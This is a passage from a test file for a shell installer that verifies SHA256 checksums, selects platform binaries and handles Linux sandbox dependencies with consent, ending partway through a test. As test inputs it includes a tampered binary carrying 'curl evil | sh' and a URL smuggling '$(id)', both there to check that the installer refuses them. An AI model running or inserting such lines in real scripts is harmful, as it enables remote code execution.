// scripts/install.sh and scripts/release-assets.sh (CLI-01, SPEC R1 「一行指令安裝」, R5 on Linux). Everything is served
// from 127.0.0.1 or handed over by a stand-in `curl`: no test reaches the network. A fake release (tiny scripts
// standing in for the four executables), a fake HOME, and stand-ins on PATH for what the installer must not really do
// here: `uname` (so every OS/arch combination runs on any host), `ldd`, `sysctl`, `id`, `xattr`, `sudo`, `apt-get`,
// `apparmor_parser`, `tee`. The Linux sandbox checks look below a fake root (SMURG_INSTALL_TEST_SYSROOT), so they give
// the same answers on a Mac, on a Linux CI runner that has bubblewrap installed, and anywhere else. Nothing runs sudo.
import { execFile, spawn } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync } from 'node:fs';
import { chmod, mkdir, readFile, stat, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import { makeDirs, type Dirs } from './helpers.ts';

const INSTALL = fileURLToPath(new URL('../../../scripts/install.sh', import.meta.url));
const RELEASE_ASSETS = fileURLToPath(new URL('../../../scripts/release-assets.sh', import.meta.url));
const HOST_NAME = `smurg-${process.platform}-${process.arch === 'arm64' ? 'arm64' : 'x64'}`;
const BINARY = '#!/bin/sh\necho "smurg 9.8.7 (fake release)"\n';
const SYSTEM_PATH = '/usr/bin:/bin:/usr/sbin:/sbin';
/** Every shell `curl … | sh` may land in: /bin/sh (bash in sh mode on macOS, dash on Ubuntu) and dash itself. */
const SHELLS = [...new Set(['/bin/sh', '/bin/dash'].filter((shell) => existsSync(shell)))];

interface Target {
  readonly name: string;
  readonly uname: readonly [string, string];
}
const TARGETS: readonly Target[] = [
  { name: 'smurg-darwin-arm64', uname: ['Darwin', 'arm64'] },
  { name: 'smurg-darwin-x64', uname: ['Darwin', 'x86_64'] },
  { name: 'smurg-linux-x64', uname: ['Linux', 'x86_64'] },
  { name: 'smurg-linux-arm64', uname: ['Linux', 'aarch64'] },
];
const APPARMOR_PROFILE = 'abi <abi/4.0>,\ninclude <tunables/global>\nprofile smurg-bwrap /usr/bin/bwrap flags=(unconfined) {\n  userns,\n}\n';

/** A stand-in executable for one target: says which one it is, and logs that it ran (after the install checks). */
const fakeBinary = (name: string): string => `#!/bin/sh\n[ -z "\${FAKE_LOG:-}" ] || echo "run ${name} $*" >>"$FAKE_LOG"\necho "smurg 9.8.7 (fake ${name})"\n`;

const cleanups: (() => Promise<void> | void)[] = [];
afterEach(async () => {
  while (cleanups.length > 0) await Promise.resolve((cleanups.pop() as () => Promise<void> | void)()).catch(() => {});
});

interface Release {
  readonly base: string;
  readonly requests: string[];
}

async function serve(files: Record<string, string>): Promise<Release> {
  const requests: string[] = [];
  const server: Server = createServer((req, res) => {
    requests.push(req.url ?? '');
    const body = files[(req.url ?? '').replace(/^\/r1\//, '')];
    if (body === undefined) {
      res.writeHead(404).end();
      return;
    }
    res.writeHead(200, { 'content-type': 'application/octet-stream' }).end(body);
  });
  await new Promise<void>((resolve) => server.listen({ host: '127.0.0.1', port: 0 }, resolve));
  cleanups.push(() => new Promise<void>((resolve) => server.close(() => resolve())));
  return { base: `http://127.0.0.1:${(server.address() as AddressInfo).port}/r1`, requests };
}

interface Run {
  readonly code: number;
  readonly out: string;
}

function install(dirs: Dirs, args: readonly string[]): Promise<Run> {
  return new Promise((resolve) => {
    execFile('/bin/sh', [INSTALL, ...args], { env: { PATH: SYSTEM_PATH, HOME: dirs.home }, timeout: 60_000 }, (err, stdout, stderr) => {
      resolve({ code: err ? (typeof err.code === 'number' ? err.code : 1) : 0, out: `${stdout}${stderr}` });
    });
  });
}

/** Runs `shell <args>` with exactly this environment, optionally feeding stdin (as `curl … | sh` does). */
function runShell(shell: string, args: readonly string[], env: Record<string, string>, stdin?: string): Promise<Run> {
  return new Promise((resolve, reject) => {
    const child = spawn(shell, args, { env, stdio: ['pipe', 'pipe', 'pipe'] });
    let out = '';
    child.stdout.on('data', (chunk: Buffer) => (out += chunk.toString('utf8')));
    child.stderr.on('data', (chunk: Buffer) => (out += chunk.toString('utf8')));
    const timer = setTimeout(() => child.kill('SIGKILL'), 60_000);
    child.once('error', reject);
    child.once('close', (code) => {
      clearTimeout(timer);
      resolve({ code: code ?? 1, out });
    });
    child.stdin.end(stdin ?? '');
  });
}

const sha = (text: string): string => createHash('sha256').update(text).digest('hex');

async function setup(): Promise<Dirs> {
  const dirs = await makeDirs();
  cleanups.push(() => dirs.cleanup());
  return dirs;
}

async function writeExecutable(path: string, text: string): Promise<void> {
  await mkdir(dirname(path), { recursive: true });
  await writeFile(path, text);
  await chmod(path, 0o755);
}

/** The stand-ins the installer finds first on PATH. Each one logs its call to $FAKE_LOG. */
async function fakeTools(dir: string): Promise<string> {
  const bin = join(dir, 'fakebin');
  const log = 'echo "$(basename "$0") $*" >>"$FAKE_LOG"';
  await writeExecutable(join(bin, 'uname'), `#!/bin/sh\ncase "$1" in\n  -s) echo "$FAKE_UNAME_S" ;;\n  -m) echo "$FAKE_UNAME_M" ;;\n  *) exec /usr/bin/uname "$@" ;;\nesac\n`);
  await writeExecutable(
    join(bin, 'ldd'),
    `#!/bin/sh\nif [ "\${FAKE_MUSL:-0}" = 1 ]; then echo 'musl libc (x86_64)' >&2; echo 'Version 1.2.4' >&2; exit 1; fi\necho 'ldd (Ubuntu GLIBC 2.39-0ubuntu8) 2.39'\n`,
  );
  await writeExecutable(join(bin, 'sysctl'), `#!/bin/sh\n${log}\n[ -n "\${FAKE_TRANSLATED:-}" ] || { echo "sysctl: unknown oid '$2'" >&2; exit 1; }\necho "$FAKE_TRANSLATED"\n`);
  // Never root here unless a test says so (FAKE_UID=0), whoever runs the tests: the root branch would run apt-get and
  // tee directly (their stand-ins below only log "UNEXPECTED direct").
  await writeExecutable(join(bin, 'id'), `#!/bin/sh\n[ "$1" = -u ] && { echo "\${FAKE_UID:-1000}"; exit 0; }\nexec /usr/bin/id "$@"\n`);
  // runuser -u USER -- CMD…: logged, then CMD runs with FAKE_AS_USER=USER (a stand-in bwrap can then act as the
  // unprivileged user the AppArmor restriction applies to).
  await writeExecutable(join(bin, 'runuser'), `#!/bin/sh\n${log}\n[ "$1" = -u ] || exit 2\nuser="$2"; shift 2; [ "$1" = -- ] && shift\nFAKE_AS_USER="$user" exec "$@"\n`);
  await writeExecutable(
    join(bin, 'xattr'),
    `#!/bin/sh\n${log}\ncase "$1" in\n  -p) [ "\${FAKE_QUARANTINE:-0}" = 1 ] && { echo '0081;00000000;Safari;'; exit 0; }; echo "xattr: $3: No such xattr: $2" >&2; exit 1 ;;\n  -d) exit 0 ;;\nesac\nexit 2\n`,
  );
  // sudo: logged, never run. `sudo tee FILE` keeps what it was given in $FAKE_TEE_OUT instead of writing FILE.
  await writeExecutable(
    join(bin, 'sudo'),
    `#!/bin/sh\n${log}\nif [ "$1" = tee ]; then cat >"$FAKE_TEE_OUT"; fi\nif [ "$1 $2" = "apt-get install" ]; then exit "\${FAKE_APT_EXIT:-0}"; fi\nexit 0\n`,
  );
  for (const tool of ['apt-get', 'apparmor_parser', 'tee']) await writeExecutable(join(bin, tool), `#!/bin/sh\necho "UNEXPECTED direct $(basename "$0") $*" >>"$FAKE_LOG"\nexit 99\n`);
  return bin;
}

interface Sysroot {
  readonly tools?: readonly string[];
  readonly restricted?: '0' | '1';
  readonly profile?: boolean;
  /** The body of the stand-in /usr/bin/bwrap (default: `exit 0`, a bubblewrap that can create its namespaces). */
  readonly bwrap?: string;
}

/** A fake root for the Linux checks: which tools exist, the AppArmor switch, an existing profile. */
async function fakeSysroot(dir: string, spec: Sysroot): Promise<string> {
  const root = join(dir, 'sysroot');
  await mkdir(root, { recursive: true });
  for (const tool of spec.tools ?? []) {
    const body = tool === 'bwrap' && spec.bwrap !== undefined ? spec.bwrap : 'exit 0';
    await writeExecutable(join(root, tool === 'apparmor_parser' ? 'usr/sbin' : 'usr/bin', tool), `#!/bin/sh\n${body}\n`);
  }
  if (spec.restricted !== undefined) {
    await mkdir(join(root, 'proc/sys/kernel'), { recursive: true });
    await writeFile(join(root, 'proc/sys/kernel/apparmor_restrict_unprivileged_userns'), `${spec.restricted}\n`);
  }
  if (spec.profile) {
    await mkdir(join(root, 'etc/apparmor.d'), { recursive: true });
    await writeFile(join(root, 'etc/apparmor.d/smurg-bwrap'), APPARMOR_PROFILE);
  }
  return root;
}

interface Faked {
  readonly dirs: Dirs;
  readonly env: Record<string, string>;
  readonly log: string;
  readonly prefix: string;
  readonly teeOut: string;
  readonly sysroot: string;
  calls(): Promise<string[]>;
}

async function faked(target: Target, extra: Record<string, string> = {}, sysroot: Sysroot = {}): Promise<Faked> {
  const dirs = await setup();
  const bin = await fakeTools(dirs.home);
  const log = join(dirs.home, 'calls.log');
  await writeFile(log, '');
  const tmp = join(dirs.home, 'tmp');
  await mkdir(tmp, { recursive: true });
  const root = await fakeSysroot(dirs.home, sysroot);
  const teeOut = join(dirs.home, 'tee.out');
  const env = {
    PATH: `${bin}:${SYSTEM_PATH}`,
    HOME: dirs.home,
    TMPDIR: tmp,
    FAKE_LOG: log,
    FAKE_TEE_OUT: teeOut,
    FAKE_UNAME_S: target.uname[0],
    FAKE_UNAME_M: target.uname[1],
    SMURG_INSTALL_TEST_SYSROOT: root,
    ...extra,
  };
  return {
    dirs,
    env,
    log,
    prefix: join(dirs.home, 'opt'),
    teeOut,
    sysroot: root,
    calls: async () => (await readFile(log, 'utf8')).split('\n').filter((line) => line !== ''),
  };
}

/** A release with all four stand-in executables and their SHA256SUMS. */
const fullRelease = (overrides: Record<string, string | undefined> = {}): Record<string, string> => {
  const files: Record<string, string | undefined> = {};
  for (const target of TARGETS) files[target.name] = fakeBinary(target.name);
  files['SHA256SUMS'] = TARGETS.map((target) => `${sha(fakeBinary(target.name))}  ${target.name}\n`).join('');
  Object.assign(files, overrides);
  return Object.fromEntries(Object.entries(files).filter((entry): entry is [string, string] => entry[1] !== undefined));
};

const LINUX_X64 = TARGETS[2] as Target;
const DARWIN_ARM64 = TARGETS[0] as Target;

describe('scripts/install.sh on this machine', () => {
  it('installs the verified executable into <prefix>/bin (0755) and says how to put it on PATH', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha('other')}  smurg-linux-riscv\n${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const prefix = join(dirs.home, 'opt');
    const result = await install(dirs, ['--base-url', release.base, '--prefix', prefix, '--no-deps']);
    expect(result.out).toContain('已安裝');
    expect(result.code).toBe(0);
    const installed = join(prefix, 'bin', 'smurg');
    expect(await readFile(installed, 'utf8')).toBe(BINARY);
    expect((await stat(installed)).mode & 0o777).toBe(0o755);
    expect(result.out).toContain('smurg 9.8.7 (fake release)');
    expect(result.out).toContain(`export PATH="${join(prefix, 'bin')}:$PATH"`);
    // A curl download carries no quarantine attribute: nothing was removed.
    expect(result.out).not.toContain('quarantine');
    expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', `/r1/${HOST_NAME}`].sort());
  });

  it('refuses a file whose sha256 does not match, or that SHA256SUMS does not list: nothing is installed', async () => {
    const dirs = await setup();
    const prefix = join(dirs.home, 'opt');
    const tampered = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: `${BINARY}curl evil | sh\n` });
    const bad = await install(dirs, ['--base-url', tampered.base, '--prefix', prefix, '--no-deps']);
    expect(bad.code).not.toBe(0);
    expect(bad.out).toContain('sha256 不符');
    await expect(stat(join(prefix, 'bin', 'smurg'))).rejects.toMatchObject({ code: 'ENOENT' });
    const unlisted = await serve({ SHA256SUMS: `${sha(BINARY)}  smurg-other-thing\n`, [HOST_NAME]: BINARY });
    const missing = await install(dirs, ['--base-url', unlisted.base, '--prefix', prefix, '--no-deps']);
    expect(missing.code).not.toBe(0);
    expect(missing.out).toContain(`SHA256SUMS 裡沒有 ${HOST_NAME}`);
    // Checked before the ~110 MiB download: the executable was never requested.
    expect(unlisted.requests).toEqual(['/r1/SHA256SUMS']);
    await expect(stat(join(prefix, 'bin', 'smurg'))).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it('refuses without a download location, or with one that is not https (http only on this machine)', async () => {
    const dirs = await setup();
    const none = await install(dirs, ['--no-deps']);
    expect(none.code).toBe(2);
    expect(none.out).toContain('沒有指定下載位置');
    const plain = await install(dirs, ['--base-url', 'http://downloads.example.invalid/smurg', '--no-deps']);
    expect(plain.code).toBe(2);
    expect(plain.out).toContain('必須是 https');
    const odd = await install(dirs, ['--base-url', 'https://example.invalid/$(id)', '--no-deps']);
    expect(odd.code).toBe(2);
    const unknown = await install(dirs, ['--frobnicate']);
    expect(unknown.code).toBe(2);
    expect(unknown.out).toContain('不認得的參數 --frobnicate');
  });

  it('works as `curl … | sh`: the script on stdin, the URL from SMURG_INSTALL_BASE_URL, the default prefix ~/.local', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const script = await readFile(INSTALL, 'utf8');
    for (const shell of SHELLS) {
      const result = await runShell(shell, ['-s', '--', '--no-deps'], { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_INSTALL_BASE_URL: release.base }, script);
      expect(result.out).toContain('smurg 安裝完成');
      expect(result.code).toBe(0);
      expect(await readFile(join(dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(BINARY);
    }
  });

  it('a download cut short runs nothing: every step is inside main, called on the last line', async () => {
    const dirs = await setup();
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const script = await readFile(INSTALL, 'utf8');
    const lines = script.split('\n');
    const mainCall = lines.lastIndexOf('main "$@"');
    expect(mainCall).toBeGreaterThan(0);
    expect(lines.slice(mainCall + 1).join('').trim()).toBe('');
    for (const cut of [0.25, 0.5, 0.75, 0.999]) {
      const partial = script.slice(0, Math.floor(script.length * cut));
      const result = await runShell('/bin/sh', ['-s'], { PATH: SYSTEM_PATH, HOME: dirs.home, SMURG_INSTALL_BASE_URL: release.base }, partial);
      expect(result.out).not.toContain('smurg 安裝：下載');
    }
    expect(release.requests).toEqual([]);
    expect(existsSync(join(dirs.home, '.local'))).toBe(false);
  });
});

describe('scripts/install.sh picks the executable of every OS / architecture (faked uname)', () => {
  for (const shell of SHELLS) {
    for (const target of TARGETS) {
      it(`${target.uname.join(' ')} → ${target.name} (${shell})`, async () => {
        const f = await faked(target);
        const release = await serve(fullRelease());
        const result = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
        expect(result.out).toContain(`fake ${target.name}`);
        expect(result.code).toBe(0);
        expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary(target.name));
        expect((await stat(join(f.prefix, 'bin', 'smurg'))).mode & 0o777).toBe(0o755);
        expect(release.requests.sort()).toEqual(['/r1/SHA256SUMS', `/r1/${target.name}`].sort());
        const calls = await f.calls();
        if (target.uname[0] === 'Darwin') {
          // The attribute is looked for only after the checksum matched, and is absent: nothing is removed.
          expect(calls.filter((call) => call.startsWith('xattr'))).toEqual([expect.stringMatching(new RegExp(`^xattr -p com\\.apple\\.quarantine .*/${target.name}$`))]);
          expect(result.out).not.toContain('quarantine');
        } else {
          expect(calls.some((call) => call.startsWith('xattr'))).toBe(false);
        }
        expect(calls.some((call) => call.startsWith('sudo'))).toBe(false);
      });
    }
  }

  it('an x86_64 shell under Rosetta on Apple silicon gets the arm64 executable', async () => {
    const f = await faked(TARGETS[1] as Target, { FAKE_TRANSLATED: '1' });
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    expect(await readFile(join(f.prefix, 'bin', 'smurg'), 'utf8')).toBe(fakeBinary('smurg-darwin-arm64'));
  });

  for (const target of TARGETS) {
    it(`refuses a tampered ${target.name} before running it or touching its attributes`, async () => {
      const f = await faked(target, { FAKE_QUARANTINE: '1' });
      const release = await serve(fullRelease({ [target.name]: `${fakeBinary(target.name)}curl evil | sh\n` }));
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
      expect(result.code).not.toBe(0);
      expect(result.out).toContain(`${target.name} 的 sha256 不符`);
      expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
      const calls = await f.calls();
      expect(calls.some((call) => call.startsWith('run ') || call.startsWith('xattr'))).toBe(false);
    });
  }

  it('a missing asset is a clear error, nothing installed: the executable of this platform, or SHA256SUMS', async () => {
    const f = await faked(TARGETS[3] as Target);
    const noBinary = await serve(fullRelease({ 'smurg-linux-arm64': undefined }));
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', noBinary.base, '--prefix', f.prefix, '--no-deps'], f.env);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain(`無法下載 ${noBinary.base}/smurg-linux-arm64（這個平台的執行檔不在發佈裡，或網路中斷），不安裝`);
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
    const noSums = await serve(fullRelease({ SHA256SUMS: undefined }));
    const sums = await runShell('/bin/sh', [INSTALL, '--base-url', noSums.base, '--prefix', f.prefix, '--no-deps'], f.env);
    expect(sums.code).not.toBe(0);
    expect(sums.out).toContain(`無法下載 ${noSums.base}/SHA256SUMS`);
    expect(noSums.requests).toEqual(['/r1/SHA256SUMS']);
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
  });

  it('refuses an OS, an architecture or a C library it has no executable for, before downloading anything', async () => {
    const release = await serve(fullRelease());
    const cases: [Target, Record<string, string>, string][] = [
      [{ name: '-', uname: ['FreeBSD', 'amd64'] }, {}, '不支援這個作業系統：FreeBSD'],
      [{ name: '-', uname: ['Linux', 'riscv64'] }, {}, '不支援這個處理器架構：riscv64'],
      [LINUX_X64, { FAKE_MUSL: '1' }, 'musl'],
    ];
    for (const [target, extra, message] of cases) {
      const f = await faked(target, extra);
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code).not.toBe(0);
      expect(result.out).toContain(message);
    }
    expect(release.requests).toEqual([]);
  });

  it('an executable that does not run here is not installed, and says why', async () => {
    const f = await faked(LINUX_X64);
    const broken = '#!/bin/sh\necho "error while loading shared libraries: libstdc++.so.6" >&2\nexit 127\n';
    const release = await serve(fullRelease({ 'smurg-linux-x64': broken, SHA256SUMS: `${sha(broken)}  smurg-linux-x64\n` }));
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps'], f.env);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain('libstdc++.so.6');
    expect(result.out).toContain('無法在這台電腦上執行');
    expect(existsSync(join(f.prefix, 'bin'))).toBe(false);
  });
});

describe('scripts/install.sh on macOS: com.apple.quarantine', () => {
  it('removes the attribute only after the checksum matched, and before the executable first runs', async () => {
    const f = await faked(DARWIN_ARM64, { FAKE_QUARANTINE: '1' });
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    const calls = await f.calls();
    const query = calls.findIndex((call) => /^xattr -p com\.apple\.quarantine .*\/smurg-darwin-arm64$/.test(call));
    const removal = calls.findIndex((call) => /^xattr -d com\.apple\.quarantine .*\/smurg-darwin-arm64$/.test(call));
    const firstRun = calls.findIndex((call) => call.startsWith('run smurg-darwin-arm64'));
    expect(query).toBeGreaterThanOrEqual(0);
    expect(removal).toBeGreaterThan(query);
    expect(firstRun).toBeGreaterThan(removal);
    expect(result.out).toContain('已移除下載檔案的 com.apple.quarantine 屬性');
  });

  it.skipIf(process.platform !== 'darwin')('with the real xattr: a quarantined download is installed without the attribute', async () => {
    const dirs = await setup();
    const bin = join(dirs.home, 'fakebin');
    // curl as usual, then the file gets the attribute a browser download would carry.
    await writeExecutable(
      join(bin, 'curl'),
      `#!/bin/sh\n/usr/bin/curl "$@" || exit $?\nout=''; prev=''\nfor a in "$@"; do [ "$prev" = -o ] && out="$a"; prev="$a"; done\ncase "$out" in */smurg-darwin-*) /usr/bin/xattr -w com.apple.quarantine '0081;00000000;Safari;' "$out" ;; esac\n`,
    );
    const release = await serve({ SHA256SUMS: `${sha(BINARY)}  ${HOST_NAME}\n`, [HOST_NAME]: BINARY });
    const prefix = join(dirs.home, 'opt');
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', prefix], { PATH: `${bin}:${SYSTEM_PATH}`, HOME: dirs.home });
    expect(result.code).toBe(0);
    expect(result.out).toContain('已移除下載檔案的 com.apple.quarantine 屬性');
    const check = await runShell('/usr/bin/xattr', ['-p', 'com.apple.quarantine', join(prefix, 'bin', 'smurg')], { PATH: SYSTEM_PATH });
    expect(check.code).not.toBe(0);
  });
});

describe('scripts/install.sh on Linux: the guest sandbox needs, with consent only', () => {
  const missingAll: Sysroot = { tools: ['apt-get', 'apparmor_parser'], restricted: '1' };

  it('without a terminal and without --yes it asks nobody and runs no sudo: it prints the commands', async () => {
    const f = await faked(LINUX_X64, {}, missingAll);
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
    expect(result.code).toBe(0);
    expect(result.out).toContain('客人沙盒需要的套件還沒安裝：bubblewrap socat ripgrep');
    expect(result.out).toContain('sudo apt-get install bubblewrap socat ripgrep');
    expect(result.out).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
    expect(result.out).toContain('profile smurg-bwrap /usr/bin/bwrap flags=(unconfined)');
    expect(result.out).toContain('客人沙盒需要的套件：還沒安裝');
    expect(result.out).toContain('AppArmor：還沒處理');
    const calls = await f.calls();
    expect(calls.filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
    expect(existsSync(f.teeOut)).toBe(false);
  });

  it('with --yes it installs the packages and the AppArmor profile through sudo, and says so', async () => {
    const f = await faked(LINUX_X64, {}, missingAll);
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--yes'], f.env);
    expect(result.code).toBe(0);
    const calls = await f.calls();
    expect(calls.filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([
      'sudo apt-get update -qq',
      'sudo apt-get install -y bubblewrap socat ripgrep',
      'sudo tee /etc/apparmor.d/smurg-bwrap',
      'sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap',
    ]);
    expect(await readFile(f.teeOut, 'utf8')).toBe(APPARMOR_PROFILE);
    expect(result.out).toContain('客人沙盒需要的套件：已安裝：bubblewrap socat ripgrep');
    expect(result.out).toContain('AppArmor：已安裝 /etc/apparmor.d/smurg-bwrap');
    // Only the real root is written by sudo; the fake root stays as it was.
    expect(existsSync(join(f.sysroot, 'etc'))).toBe(false);
  });

  it('asks for nothing that is already there, and a failed apt-get is reported without failing the install', async () => {
    const ready = await faked(LINUX_X64, {}, { tools: ['bwrap', 'socat', 'rg', 'apt-get', 'apparmor_parser'], restricted: '1', profile: true });
    const release = await serve(fullRelease());
    const done = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', ready.prefix, '--yes'], ready.env);
    expect(done.code).toBe(0);
    expect(done.out).toContain('客人沙盒需要的套件：已經有 bubblewrap、socat、ripgrep');
    expect(done.out).toContain('AppArmor：已生效（bubblewrap 可以建立客人沙盒）');
    expect((await ready.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);

    const open = await faked(LINUX_X64, { FAKE_APT_EXIT: '100' }, { tools: ['bwrap', 'apt-get'], restricted: '0' });
    const failed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', open.prefix, '--yes'], open.env);
    expect(failed.code).toBe(0);
    expect(failed.out).toContain('套件安裝失敗，請自行安裝：sudo apt-get install socat ripgrep');
    expect(failed.out).toContain('AppArmor：不需要');
    expect((await open.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual(['sudo apt-get update -qq', 'sudo apt-get install -y socat ripgrep']);
  });

  // review linux-binary F4: the AppArmor step is decided by what bubblewrap can do (the daemon's own probe), not by
  // whether /etc/apparmor.d/smurg-bwrap exists: a profile file that is not loaded left bubblewrap blocked while the
  // installer said 「已經有」 and offered nothing.
  const blockedUntilInstalled = 'if [ -s "$FAKE_TEE_OUT" ]; then exit 0; fi; echo "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" >&2; exit 1';
  const withProfileFile = (bwrap: string): Sysroot => ({ tools: ['bwrap', 'socat', 'rg', 'apt-get', 'apparmor_parser'], restricted: '1', profile: true, bwrap });

  it('a profile file that is there but not in effect (bubblewrap still refused) is not taken for done: the fix is printed, and installed with consent', async () => {
    const release = await serve(fullRelease());
    const asked = await faked(LINUX_X64, {}, withProfileFile(blockedUntilInstalled));
    const printed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', asked.prefix], asked.env);
    expect(printed.code).toBe(0);
    expect(printed.out).toContain('/etc/apparmor.d/smurg-bwrap 已經存在，但沒有生效');
    expect(printed.out).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
    expect(printed.out).toContain('AppArmor：還沒處理');
    expect((await asked.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);

    const yes = await faked(LINUX_X64, {}, withProfileFile(blockedUntilInstalled));
    const fixed = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', yes.prefix, '--yes'], yes.env);
    expect(fixed.code).toBe(0);
    expect((await yes.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual(['sudo tee /etc/apparmor.d/smurg-bwrap', 'sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap']);
    expect(await readFile(yes.teeOut, 'utf8')).toBe(APPARMOR_PROFILE);
    expect(fixed.out).toContain('AppArmor：已安裝 /etc/apparmor.d/smurg-bwrap（只放寬 /usr/bin/bwrap）');
  });

  it('run as root (sudo sh install.sh) the probe runs as the user sudo came from, else nobody: root\'s own bubblewrap passes without the profile, which is not proof (review RV-5)', async () => {
    const release = await serve(fullRelease());
    // A bubblewrap without the profile: refused for an unprivileged user, fine for root.
    const rootOnly = 'if [ -n "${FAKE_AS_USER:-}" ]; then echo "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" >&2; exit 1; fi; exit 0';
    const sysroot: Sysroot = { tools: ['bwrap', 'socat', 'rg', 'apparmor_parser'], restricted: '1', bwrap: rootOnly };
    for (const [env, user] of [
      [{ FAKE_UID: '0', SUDO_USER: 'alice' }, 'alice'],
      [{ FAKE_UID: '0' }, 'nobody'],
      [{ FAKE_UID: '0', SUDO_USER: 'root' }, 'nobody'],
    ] as const) {
      const f = await faked(LINUX_X64, env, sysroot);
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code, user).toBe(0);
      expect(result.out, user).toContain('AppArmor：還沒處理');
      expect(result.out, user).not.toContain('已生效');
      expect(result.out, user).toContain('sudo apparmor_parser -r /etc/apparmor.d/smurg-bwrap');
      expect((await f.calls()).filter((call) => call.startsWith('runuser')), user).toEqual([`runuser -u ${user} -- ${f.sysroot}/usr/bin/bwrap --unshare-user --unshare-net --ro-bind / / -- /bin/true`]);
      expect((await f.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call)), user).toEqual([]);
    }
    // With the profile in effect the user's bubblewrap works too: then it is.
    const loaded = await faked(LINUX_X64, { FAKE_UID: '0', SUDO_USER: 'alice' }, { ...sysroot, bwrap: 'exit 0' });
    const ok = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', loaded.prefix], loaded.env);
    expect(ok.out).toContain('AppArmor：已生效');
  });

  it('a bubblewrap that fails for another reason is not blamed on AppArmor; without bubblewrap the file alone is reported as unconfirmed', async () => {
    const release = await serve(fullRelease());
    const other = await faked(LINUX_X64, {}, withProfileFile('echo "bwrap: execvp /bin/true: No such file or directory" >&2; exit 1'));
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', other.prefix, '--yes'], other.env);
    expect(result.code).toBe(0);
    expect(result.out).toContain('AppArmor：無法確認（bubblewrap：bwrap: execvp /bin/true: No such file or directory；smurg host 會再檢查）');
    expect((await other.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);

    const noBwrap = await faked(LINUX_X64, {}, { tools: ['socat', 'rg', 'apparmor_parser'], restricted: '1', profile: true });
    const checked = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', noBwrap.prefix], noBwrap.env);
    expect(checked.code).toBe(0);
    expect(checked.out).toContain('AppArmor：已經有 /etc/apparmor.d/smurg-bwrap（還沒有 bubblewrap 可以確認是否生效；smurg host 會檢查）');
  });

  it('--no-deps checks nothing', async () => {
    const f = await faked(LINUX_X64, {}, missingAll);
    const release = await serve(fullRelease());
    const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix, '--no-deps', '--yes'], f.env);
    expect(result.code).toBe(0);
    expect(result.out).toContain('沒有檢查（--no-deps）');
    expect((await f.calls()).filter((call) => /^(sudo|UNEXPECTED)/.test(call))).toEqual([]);
  });
});

describe('scripts/install.sh: how to put the executable on PATH', () => {
  it('names the profile of the person’s shell, and says nothing when the directory is already on PATH', async () => {
    const release = await serve(fullRelease());
    const cases: [Target, string, string][] = [
      [DARWIN_ARM64, '/bin/zsh', '~/.zshrc'],
